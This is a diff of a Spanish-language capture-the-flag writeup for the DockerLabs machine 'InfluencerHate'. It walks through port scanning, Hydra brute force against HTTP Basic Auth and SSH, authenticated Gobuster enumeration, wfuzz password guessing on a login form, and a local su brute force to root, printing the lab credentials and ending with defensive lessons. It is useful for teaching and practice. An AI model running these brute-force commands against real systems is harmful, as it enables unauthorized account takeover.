@@ -1,115 +1,191 @@
-# INFLUENCERHATE — DockerLabs
+# InfluencerHate — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** El Pingüino de Mario  
+**Fecha de creación:** 28/06/2025  
+**Técnicas:** Nmap · HTTP Basic Auth · Hydra · Burp Suite · Gobuster con auth · wfuzz · SCP · Linux-Su-Force · Privesc (root fuerza bruta local)
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **INFLUENCERHATE** de DockerLabs.
-
----
-
-## 1. Reconocimiento
-
-Vamos a desplegar la maquina vulnerable.
-
-Haremos un escaneo profundo de los puertos de la maquina.
-
-Vemos que el servicio http, nos pide que inicie sesión.
-
-## 2. Enumeración
-
-Haremos un ataque de fuerza bruta con hydra con los siguientes parametros.
--C /ruta/al/archivo → usa un archivo de combinaciones. Cada línea debe estar
-en el formato usuario:contraseña. Hydra leerá esas líneas y probará cada par tal
-cual.
--s 80 → puerto a usar (aquí el puerto 80, típico de HTTP). Es redundante en este
-caso porque http-get por defecto usa 80, pero fuerza el puerto.
-http-get → módulo/servicio que indica a hydra que pruebe autenticación HTTP vía
-GET. Esto normalmente se usa contra recursos que requieren HTTP Basic (o
-similar) auth. No es el módulo correcto para sitios con formularios HTML (para
-formularios se usa http-form-post o http-get-form con parámetros).
-
-Ahora que tenemos las credenciales, podemos poner la contraseña y ejecutar
-burp suite para tener más información.
-
-Con gobuster ahora que tenemos la Authorization lo que haremos será listar
-directorios con los siguientes parametros.
--H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
-Añade una cabecera HTTP personalizada en todas las peticiones. es la cabecera
-de Basic Auth que sacamos con Burp.
-
-## 3. Explotación
-
-Ahora que tenemos un login.php lo vamos a explorar.
-
-Despues de varias pruebas, volvemos a utilizar burp para obtener más
-información y poder hacer algo con eso.
-
-Utilizando la herramienta wfuzz vamos a encontrar la contraseña de admin.
-wfuzz
-La herramienta (web fuzzer / brute-forcer para aplicaciones web).
--c
-Coloriza la salida (más legible en terminal).
--z file,/usr/share/wordlists/rockyou.txt
--z define el payload (fuente de datos). file,PATH indica que se leerá la wordlist
-desde ese archivo: en este caso rockyou.txt (lista de contraseñas). Por cada línea
-de esa lista wfuzz hará una prueba.
--t 50
-Threads concurrentes: 50 peticiones en paralelo. Aumenta velocidad, pero
-también carga y ruido en el objetivo.
---hh=2848
-Oculta (hide) las respuestas cuyo número de caracteres en el cuerpo sea 2848. Es
-una forma común de filtrar la página de "login fallido" (si esa página tiene siempre
-ese tamaño) para que wfuzz muestre sólo respuestas con tamaños distintos —
-posibles indicios de login correcto u otra respuesta útil. En wfuzz hay filtros
-similares para códigos (--hc), líneas (--hl) y palabras (--hw).
--H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
-Añade esa cabecera HTTP en todas las peticiones. Decodificando la Base64
-aHR0cGFkbWluOmZodHRwYWRtaW4= obtienes httpadmin:fhttpadmin
-(usuario:contraseña). Con esto pruebas el formulario mientras el servidor también
-recibe la cabecera Basic Auth — útil si la página requiere autenticación HTTP
-además del formulario.
--H "Content-Type: application/x-www-form-urlencoded"
-Indica que el cuerpo POST es un formulario web estándar (clave=valor), que es lo
-que login.php esperará normalmente.
--d "username=admin&password=FUZZ"
-Cuerpo de la petición POST. FUZZ es el marcador que wfuzz sustituye por cada
-entrada de la wordlist (cada contraseña de rockyou.txt). Estás probando el usuario
-fijo admin con cada contraseña.
-
-## 4. Post-explotación
-
-http://172.17.0.2/login.php
-URL objetivo (la acción del formulario).
-
-Encontramos un usuario
-
-Ahora utilizaremos hydra para encontrar la contraseña por ssh.
-Intentamos hacer una escalada de privilegios, pero no encontramos ninguna
-forma, así que utilizaremos una herramienta para hacer fuerza bruta al usuario
-root.
-
-## 5. Escalada de privilegios
-
-Despues al intentar con wget, curl, no tenemos éxito para compartir esta
-herramienta y como sabemos el usuario y la contraseña de ssh, lo compartiremos
-por scp.
-
-Ahora lo ejecutamos y nos da la contraseña
-
-Somos root.
-
-## 6. Lección aprendida
-
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
-
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [HTTP Basic Auth — Hydra con lista de combinaciones](#2-http-basic-auth--hydra-con-lista-de-combinaciones)
+3. [Burp Suite — extraer cabecera Authorization](#3-burp-suite--extraer-cabecera-authorization)
+4. [Gobuster autenticado — descubrimiento de login.php](#4-gobuster-autenticado--descubrimiento-de-loginphp)
+5. [wfuzz — fuerza bruta en formulario web](#5-wfuzz--fuerza-bruta-en-formulario-web)
+6. [Acceso SSH como balutin y escalada a root](#6-acceso-ssh-como-balutin-y-escalada-a-root)
+7. [Lección aprendida](#7-lección-aprendida)
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
+## 1. Despliegue y reconocimiento
+
+```bash
+sudo bash auto_deploy.sh influencerhate.tar
+```
+
+> IP asignada: `172.17.0.2`.
+
+Escaneo completo:
+
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+cat Puertos
+```
+
+```
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+| HTTP/1.1 401 Unauthorized
+|_Basic realm=Zona restringida
+|_http-title: 401 Unauthorized\xB0
+```
+
+El puerto 80 pide **HTTP Basic Auth** — usuario y contraseña antes de acceder.
+
+---
+
+## 2. HTTP Basic Auth — Hydra con lista de combinaciones
+
+HTTP Basic Auth combina usuario:contraseña en Base64 en la cabecera `Authorization`. Usamos Hydra con una lista de combinaciones conocidas:
+
+```bash
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
+  172.17.0.2 -s 80 http-get /
+```
+
+```
+[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
+1 of 1 target successfully completed, 1 valid password found
+```
+
+Credenciales HTTP Basic: **httpadmin:fhttpadmin**
+
+> 💡 `-C` en Hydra usa un fichero de combinaciones `usuario:contraseña` en cada línea, en lugar de dos listas separadas. Ideal para Basic Auth donde las credenciales por defecto son predecibles.
+
+---
+
+## 3. Burp Suite — extraer cabecera Authorization
+
+Accedemos a la web con las credenciales. Capturamos la petición con Burp para ver la cabecera `Authorization`:
+
+```
+Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
+```
+
+Decodificamos: `aHR0cGFkbWluOmZodHRwYWRtaW4=` → **httpadmin:fhttpadmin**. Necesitamos esta cabecera para todas las peticiones posteriores.
+
+---
+
+## 4. Gobuster autenticado — descubrimiento de login.php
+
+Con la cabecera de autenticación, lanzamos Gobuster:
+
+```bash
+sudo gobuster dir -u http://172.17.0.2 \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,html,py,txt \
+  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
+  -t 100 -k -r
+```
+
+```
+/login.php    (Status: 200) [Size: 3798]
+/index.html   (Status: 200) [Size: 10791]
+```
+
+Visitamos `http://172.17.0.2/login.php` — "Área privada. Prohibido el paso si eres youtuber de ciberseguridad." Formulario POST con usuario y contraseña.
+
+---
+
+## 5. wfuzz — fuerza bruta en formulario web
+
+Capturamos la petición POST con Burp para ver el cuerpo: `username=admin&password=admin`. Usamos wfuzz para bruteforcear la contraseña del usuario `admin`:
+
+```bash
+wfuzz -c \
+  -z file,/usr/share/wordlists/rockyou.txt \
+  -t 50 \
+  --hh=2848 \
+  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=FUZZ" \
+  http://172.17.0.2/login.php
+```
+
+```
+ID       Response   Lines   Word    Chars       Payload
+00000027   200       84 l    216 W   1023 Ch     "chocolate"
+```
+
+> 💡 **`--hh=2848`** oculta las respuestas con ese número de caracteres — el tamaño de la página "login fallido". Solo muestra respuestas diferentes, que indican login exitoso.
+
+El login exitoso muestra: **"¡Login correcto! De parte del usuario balutin, te damos la enhorabuena"**
+
+---
+
+## 6. Acceso SSH como balutin y escalada a root
+
+Con el nombre de usuario **balutin** identificado, buscamos su contraseña SSH con Hydra:
+
+```bash
+hydra -l balutin -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+```
+
+```
+[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
+```
+
+```bash
+ssh balutin@172.17.0.2
+balutin@172.17.0.2's password: estrella
+balutin@63c3216c49b7:~$
+```
+
+Sin escalada directa por sudo o SUID. Transferimos **Linux-Su-Force** via SCP:
+
+```bash
+scp rockyou.txt balutin@172.17.0.2:/home/balutin
+scp Linux-Su-Force.sh balutin@172.17.0.2:/home/balutin
+```
+
+Ejecutamos fuerza bruta local contra root:
+
+```bash
+balutin@63c3216c49b7:~$ ./Linux-Su-Force.sh root rockyou.txt
+Contraseña encontrada para el usuario root: rockyou
+```
+
+```bash
+balutin@63c3216c49b7:~$ su root
+Password: rockyou
+root@63c3216c49b7:/home/balutin# whoami
+root
+```
+
+✅ Somos **root**.
+
+---
+
+## 7. Lección aprendida
+
+| Vulnerabilidad | Dónde | Impacto |
+|----------------|-------|---------|
+| **HTTP Basic Auth con credenciales por defecto** | Puerto 80 | Bypass de autenticación de primer nivel |
+| **Formulario web con contraseña débil (chocolate)** | `/login.php` | Revelación del usuario balutin |
+| **Contraseña SSH débil (estrella)** | Usuario balutin | Acceso al sistema |
+| **Contraseña de root trivial (rockyou)** | Usuario root | Escalada completa |
+
+**Para defenderse:**
+- HTTP Basic Auth con credenciales por defecto es la primera cosa que un atacante prueba.
+- Evitar contraseñas de una sola palabra que aparecen en rockyou.txt — "chocolate", "estrella", "rockyou" están en las primeras posiciones.
+- Limitar los intentos de login (rate limiting, fail2ban) para bloquear ataques de fuerza bruta locales y remotos.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
 *¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
